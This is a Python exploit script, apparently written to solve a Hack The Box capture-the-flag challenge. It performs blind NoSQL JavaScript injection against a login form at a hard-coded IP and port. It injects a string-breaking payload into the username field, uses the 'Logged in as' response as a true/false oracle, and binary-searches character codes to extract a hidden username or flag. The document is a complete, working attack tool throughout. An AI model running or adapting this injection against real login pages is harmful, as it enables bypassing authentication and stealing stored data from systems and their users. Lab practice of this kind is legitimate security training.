#!/usr/bin/python3

import requests
from urllib.parse import quote_plus
import time

# Oracle (answers True or False)
num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    try:
        r = requests.post(
            "http://94.237.54.116:47557/index.php",
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="')),
            timeout=3
        )
        return "Logged in as" in r.text
    except:
        time.sleep(1)
        return False

# Ensure the oracle is working correctly
print("Testing oracle...")
assert (oracle('false') == False), "False test failed"
assert (oracle('true') == True), "True test failed"
print("Oracle working correctly!")

# Dump the username (binary search)
print("\nStarting binary search...")
num_req = 0 # Reset the request counter
username = "HTB{" # Known beginning of username
i = 4 # Skip the first 4 characters (HTB{)
start_time = time.time()

try:
    while username[-1] != "}": # Repeat until we meet '}' aka end of username
        print(f"\rPosition {i} | Current: {username}", end="", flush=True)
        low = 32 # Set low value of search area (' ')
        high = 127 # Set high value of search area ('~')
        mid = 0
        while low <= high:
            mid = (high + low) // 2 # Calculate the midpoint of the search area
            if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
                low = mid + 1 # If ASCII value of username at index 'i' < midpoint, increase the lower boundary and repeat
            elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
                high = mid - 1 # If ASCII value of username at index 'i' > midpoint, decrease the upper boundary and repeat
            else:
                username += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
                print(f"\nFound char: {chr(mid)} | Current: {username}")
                break # Break out of the loop
        i += 1 # Increment the index counter
        time.sleep(0.1)  # Small delay between positions

    assert (oracle('this.username == `%s`' % username) == True)
    elapsed = time.time() - start_time
    print("\n---- Binary search results ----")
    print("Username:", username)
    print("Requests:", num_req)
    print(f"Time taken: {elapsed:.2f} seconds")

except KeyboardInterrupt:
    print("\nSearch interrupted!")
except Exception as e:
    print(f"\nError in binary search: {e}")

finally:
    # Save the result
    with open("flag.txt", "w") as f:
        f.write(username)
    print("\nFinal result saved to flag.txt")